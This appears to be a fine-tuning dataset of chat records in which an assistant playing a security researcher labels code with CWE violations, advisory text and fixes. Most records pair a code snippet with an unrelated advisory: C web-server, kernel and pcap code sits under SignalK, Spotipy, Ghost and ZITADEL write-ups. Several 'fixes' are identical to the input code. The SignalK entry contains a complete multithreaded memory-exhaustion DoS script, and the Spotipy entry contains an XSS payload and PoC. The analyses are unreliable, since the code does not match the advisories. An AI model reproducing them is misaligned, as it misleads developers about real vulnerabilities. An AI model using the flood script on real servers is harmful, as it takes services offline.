NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-770\nREASON: ### Summary\nA Denial of Service (DoS) vulnerability allows an unauthenticated attacker to crash the SignalK Server by flooding the access request endpoint (`/signalk/v1/access/requests`). This causes a \"JavaScript heap out of memory\" error due to unbounded in-memory storage of request objects.\n\n### Details\nThe vulnerability is caused by a lack of rate limiting and improper memory management for incoming access requests.\n\n**Vulnerable Code Analysis:**\n1.  **In-Memory Storage**: In `src/requestResponse.js`, requests are stored in a simple JavaScript object:\n    ```javascript\n    const requests = {}\n    ```\n2.  **Unbounded Growth**: The `createRequest` function adds new requests to this object without checking the current size or count of existing requests.\n3.  **Infrequent Pruning**: The `pruneRequests` function, which removes old requests, runs only once every **15 minutes** (`pruneIntervalRate`).\n4.  **No Rate Limiting**: The endpoint `/signalk/v1/access/requests` accepts POST requests from any client without any rate limiting or authentication (by design, as it's for initial access requests).\n\n**Exploit Scenario:**\n1.  An attacker sends a large number of POST requests (e.g., 20,000+) or requests with large payloads to `/signalk/v1/access/requests`.\n2.  The server stores every request in the `requests` object in the Node.js heap.\n3.  The heap memory usage spikes rapidly.\n4.  The Node.js process hits its memory limit (default ~1.5GB) and crashes with `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`.\n\n### PoC\nThe following Python script reproduces the crash by flooding the server with requests containing 100KB payloads.\n\n```python\nimport urllib.request\nimport json\nimport threading\nimport time\n\n# Target Configuration\nTARGET_URL = \"http://localhost:3000/signalk/v1/access/requests\"\nPAYLOAD_SIZE_MB = 0.1  # 100 KB per request\nNUM_REQUESTS = 20000   # Sufficient to exhaust heap\nCONCURRENCY = 50\n\n# Generate a large string payload\nLARGE_STRING = \"A\" * (int(PAYLOAD_SIZE_MB * 1024 * 1024))\n\ndef send_heavy_request(i):\n    try:\n        payload = {\n            \"clientId\": f\"attacker-device-{i}\",\n            \"description\": LARGE_STRING, # Stored in memory!\n            \"permissions\": \"readwrite\"\n        }\n        data = json.dumps(payload).encode('utf-8')\n        \n        req = urllib.request.Request(\n            TARGET_URL, \n            data=data, \n            headers={'Content-Type': 'application/json'}, \n            method='POST'\n        )\n        # Short timeout as server might hang\n        urllib.request.urlopen(req, timeout=5)\n    except:\n        pass\n\ndef attack():\n    print(f\"[*] Starting DoS Attack on {TARGET_URL}...\")\n    threads = []\n    for i in range(NUM_REQUESTS):\n        t = threading.Thread(target=send_heavy_request, args=(i,))\n        threads.append(t)\n        t.start()\n        \n        if len(threads) >= CONCURRENCY:\n            for t in threads: t.join()\n            threads = []\n\nif __name__ == \"__main__\":\n    attack()\n```\n\n**Expected Result:**\nMonitor the server process. Memory usage will increase rapidly, and the server will eventually terminate with an Out of Memory (OOM) error.\n\n### Impact\n**Verified Denial of Service**:\nDuring our verification using the provided PoC, we observed the following:\n1.  **Rapid Memory Exhaustion**: The Node.js process memory usage increased by approximately **30MB within seconds** of starting the attack.\n2.  **Service Instability**: Continued execution of the PoC quickly leads to a `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory` crash.\n3.  **Service Unavailability**: The server becomes completely unresponsive and terminates, requiring a manual restart to recover. This allows an unauthenticated attacker to easily take the vessel's navigation data server offline.\n\n---\n### Remediation\n**1. Implement Rate Limiting**\nUse a middleware like `express-rate-limit` to restrict the number of requests from a single IP address to `/signalk/v1/access/requests`.\n\n**2. Limit Request Storage**\nModify `src/requestResponse.js` to enforce a maximum number of stored requests (e.g., 100). If the limit is reached, reject new requests or evict the oldest ones immediately.\n\n**3. Validate Payload Size**\nEnforce strict limits on the size of the `description` and other fields in the access request payload.\nFIX:\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for malcontent vulnerable to symlink Path Traversal via handleSymlink argument confusion in archive extraction:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: malcontent could be made to create symlinks outside the intended extraction directory when scanning a specially crafted tar or deb archive. The `handleSymlink` function received arguments in the wrong order, causing the symlink target to be used as the symlink location. Additionally, symlink targets were not validated to ensure they resolved within the extraction directory.\n\n**Fixes:**\n- [Swap handleSymlink arguments; validate symlink location](https://github.com/chainguard-dev/malcontent/commit/a7dd8a5328ddbaf235568437813efa7591e00017)\n- [Validate symlink targets resolve within extraction directory](https://github.com/chainguard-dev/malcontent/commit/259fca5abc004f3ab238895463ef280a87f30e96)\n\n**Acknowledgements**\n\nThank you to Oleh Konko from [1seal](https://1seal.org/) for discovering and reporting this issue.\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Spotipy has a XSS vulnerability in its OAuth callback server:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ### Summary\nXSS vulnerability in OAuth callback server allows JavaScript injection through unsanitized error parameter. Attackers can execute arbitrary JavaScript in the user's browser during OAuth authentication.\n\n\n### Details\n**Vulnerable Code:** `spotipy/oauth2.py` lines 1238-1274 (RequestHandler.do_GET)\n\n**The Problem:**\nDuring OAuth flow, spotipy starts a local HTTP server to receive callbacks. The server reflects the `error` URL parameter directly into HTML without sanitization.\n\n**Vulnerable code at line 1255:**\n```python\nstatus = f\"failed ({self.server.error})\"\n```\n\n**Then embedded in HTML at line 1265:**\n```python\nself._write(f\"\"\"<html>\n<body>\n<h1>Authentication status: {status}</h1>\n</body>\n</html>\"\"\")\n```\n\nThe `error` parameter comes from URL parsing (lines 388-393) without HTML escaping, allowing script injection.\n\n**Attack Flow:**\n1. User starts OAuth authentication \u2192 local server runs on `http://127.0.0.1:8080`\n2. Attacker crafts malicious URL: `http://127.0.0.1:8080/?error=<script>alert(1)</script>&state=x`\n3. User visits URL \u2192 JavaScript executes in localhost origin\n\n\n### PoC\n\n**Simple Python Test:**\n```python\n#!/usr/bin/env python3\n# poc_xss.py - Demonstrates XSS in spotipy OAuth callback\n\nimport requests\nfrom spotipy.oauth2 import start_local_http_server\nimport threading\nimport time\n\n# Start vulnerable server in background\ndef start_server():\n    server = start_local_http_server(8080)\n    server.handle_request()\n\nthread = threading.Thread(target=start_server, daemon=True)\nthread.start()\ntime.sleep(2)\n\n# Send XSS payload\npayload = '<script>alert(\"XSS\")</script>'\nurl = f'http://127.0.0.1:8080/?error={payload}&state=test'\n\nresponse = requests.get(url)\nprint(f\"Status: {response.status_code}\")\nprint(f\"\\nHTML Response:\\n{response.text}\")\n\n# Check if vulnerable\nif payload in response.text:\n    print(f\"\\n[!] VULNERABLE: Payload '{payload}' reflected without escaping!\")\nelse:\n    print(\"\\n[+] Safe: Payload was sanitized\")\n```\n\n**Run it:**\n```bash\npip install spotipy requests\npython3 poc_xss.py\n```\n\n**Output shows:**\n```\nStatus: 200\nHTML Response:\n<html>\n<body>\n<h1>Authentication status: failed (<script>alert(\"XSS\")</script>)</h1>\n</body>\n</html>\n\n[!] VULNERABLE: Payload '<script>alert(\"XSS\")</script>' reflected without escaping!\n```\n\n**The Proof:**\n- Expected (safe): `&lt;script&gt;alert(\"XSS\")&lt;/script&gt;`\n- Actual (vulnerable): `<script>alert(\"XSS\")</script>`\n- The script tags are NOT escaped \u2192 XSS confirmed\n\n### Impact\n\n**Vulnerability Type:** Cross-Site Scripting (XSS) - CWE-79\n\n**Affected Users:** Anyone using spotipy's OAuth flow with localhost redirect URIs\n\n**Attack Complexity:** Medium-High\n- Requires timing (during brief OAuth window)\n- Localhost-only (127.0.0.1)\n- Requires user interaction (click malicious link)\n\n**Potential Impact:**\n- Execute JavaScript in localhost origin\n- Access other localhost services (port scanning, API calls)\n- Steal data from local web applications\n- Extract OAuth tokens from browser storage\n- Bypass CSRF protections on localhost endpoints\n\n**CVSS 3.1 Score:** 4.2 (Medium)\n- Attack Vector: Local\n- Attack Complexity: High\n- Privileges Required: None\n- User Interaction: Required\n- Scope: Unchanged\n- Confidentiality/Integrity: Low\n\n\n**Recommended Fix:**\n```python\nimport html\n\n# Line 1255 - apply HTML escaping\nif self.server.error:\n    status = f\"failed ({html.escape(str(self.server.error))})\"\n```\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Ghost has Staff 2FA bypass:\n\nstatic int netlink_realloc_groups(struct sock *sk)\n{\n\tstruct netlink_sock *nlk = nlk_sk(sk);\n\tunsigned int groups;\n\tunsigned long *new_groups;\n\tint err = 0;\n\n\tnetlink_table_grab();\n\n\tgroups = nl_table[sk->sk_protocol].groups;\n\tif (!nl_table[sk->sk_protocol].registered) {\n\t\terr = -ENOENT;\n\t\tgoto out_unlock;\n\t}\n\n\tif (nlk->ngroups >= groups)\n\t\tgoto out_unlock;\n\n\tnew_groups = krealloc(nlk->groups, NLGRPSZ(groups), GFP_ATOMIC);\n\tif (new_groups == NULL) {\n\t\terr = -ENOMEM;\n\t\tgoto out_unlock;\n\t}\n\tmemset((char *)new_groups + NLGRPSZ(nlk->ngroups), 0,\n\t       NLGRPSZ(groups) - NLGRPSZ(nlk->ngroups));\n\n\tnlk->groups = new_groups;\n\tnlk->ngroups = groups;\n out_unlock:\n\tnetlink_table_ungrab();\n\treturn err;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-287\nREASON: ### Impact\nA vulnerability in Ghost's 2FA mechanism allows staff users to skip email 2FA.\n\n### Vulnerable versions\nThis vulnerability is present in Ghost v5.105.0 to v5.130.5 to and Ghost v6.0.0 to v6.10.3.\n\n### Patches\nv5.130.6 and v6.11.0 contain a fix for this issue.\n\n### References\nGhost thanks Sho Odagiri of GMO Cybersecurity by Ierae, Inc. for discovering and disclosing this vulnerability responsibly.\n\n### For more information\nIf there are any questions or comments about this advisory, email Ghost at [security@ghost.org](mailto:security@ghost.org).\nFIX:\nstatic int netlink_realloc_groups(struct sock *sk)\n{\n\tstruct netlink_sock *nlk = nlk_sk(sk);\n\tunsigned int groups;\n\tunsigned long *new_groups;\n\tint err = 0;\n\n\tnetlink_table_grab();\n\n\tgroups = nl_table[sk->sk_protocol].groups;\n\tif (!nl_table[sk->sk_protocol].registered) {\n\t\terr = -ENOENT;\n\t\tgoto out_unlock;\n\t}\n\n\tif (nlk->ngroups >= groups)\n\t\tgoto out_unlock;\n\n\tnew_groups = krealloc(nlk->groups, NLGRPSZ(groups), GFP_ATOMIC);\n\tif (new_groups == NULL) {\n\t\terr = -ENOMEM;\n\t\tgoto out_unlock;\n\t}\n\tmemset((char *)new_groups + NLGRPSZ(nlk->ngroups), 0,\n\t       NLGRPSZ(groups) - NLGRPSZ(nlk->ngroups));\n\n\tnlk->groups = new_groups;\n\tnlk->ngroups = groups;\n out_unlock:\n\tnetlink_table_ungrab();\n\treturn err;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for ZITADEL Vulnerable to Unauthenticated Full-Read SSRF via V2 Login:\n\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-918\nREASON: ### Summary\n\nZitadel is vulnerable to an unauthenticated, full-read SSRF vulnerability. An unauthenticated remote attacker can force Zitadel into making HTTP requests to arbitrary domains, including internal addresses. The server then returns the upstream response to the attacker, enabling data exfiltration from internal services.\n\n### Impact\n\nZITADEL Login UI (V2) was vulnerable to service URL manipulation through the x-zitadel-forward-host header. The service URL resolution logic treated the header as a trusted fallback for all deployments, including self-hosted instances. This allowed unauthenticated attacker to force the server to make outbound requests and read the responses, reaching internal services, exfiltrating data, and bypassing IP-based or network-segmentation controls. \n \n### Affected Versions\n\nSystems using the login UI (v2) and running one of the following versions are affected:\n- **v4.x**: `4.0.0-rc.1` through `4.7.0`\n\n### Patches\n\nThe vulnerability has been addressed in the latest release. The patch resolves the issue by correctly validating the x-zitadel-forward-host, resp. all forwarded headers against the instance domains and trusted domains. It's no longer used to route traffic to the Zitadel API.\n\nBefore you upgrade, ensure that:\n- the `ZITADEL_API_URL` is set and is pointing to your instance, resp. system in multi-instance deployments.\n- the HTTP `host` (or a `x-forwarded-host`) is passed in your reverse proxy to the login UI.\n- a `x-zitadel-instance-host` (or `x-zitadel-forward-host`) is set in your reverse for multi-instance deployments. If you're running a single instance solution, you don't need to take any actions.\n\nFixed versions:\n- 4.x: Upgrade to >=[4.7.1](https://github.com/zitadel/zitadel/releases/tag/v4.7.1)\n\n### Workarounds\n\nThe recommended solution is to update ZITADEL to a patched version.\n\nA ZITADEL fronting proxy can be configured to delete all `x-zitadel-forward-host` header values or set it to the requested host before sending requests to ZITADEL self-hosted environments.\n\n### Questions\n\nIf you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)\n\n### Credits\n\nThanks to Amit Laish \u2013 GE Vernova for finding and reporting the vulnerability.\nFIX:\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n\t// Is this a URL rather than a device?\n\t// If so, reject it.\n\tif (is_url(source))\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string refers to a remote device\");\n\t\tgoto error;\n\t}\n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Unauthenticated Craft CMS users can trigger a database backup:\n\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = 